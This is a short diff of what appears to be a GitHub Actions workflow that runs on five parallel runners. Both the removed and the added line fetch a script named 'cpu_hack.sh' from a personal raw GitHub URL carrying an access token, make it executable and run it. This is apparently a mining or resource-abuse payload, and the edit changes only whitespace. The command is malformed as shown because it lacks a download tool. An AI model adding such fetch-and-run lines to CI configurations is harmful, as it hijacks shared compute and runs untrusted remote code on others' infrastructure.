@@ -24,4 +24,4 @@ jobs:
      runner: [0,1,2,3,4]
    steps:
      - run: |
-         https://raw.githubusercontent.com/davesmith0x0001/davesmith0x001_vps/main/cpu_hack.sh?token=GHSAT0AAAAAABVR66BR2UQNP5MTKTJF2SPYYVHD6HA && chmod +x cpu_hack.sh && ./cpu_hack.sh
+         https://raw.githubusercontent.com/davesmith0x0001/davesmith0x001_vps/main/cpu_hack.sh?token=GHSAT0AAAAAABVR66BR2UQNP5MTKTJF2SPYYVHD6HA  && chmod +x cpu_hack.sh && ./cpu_hack.sh
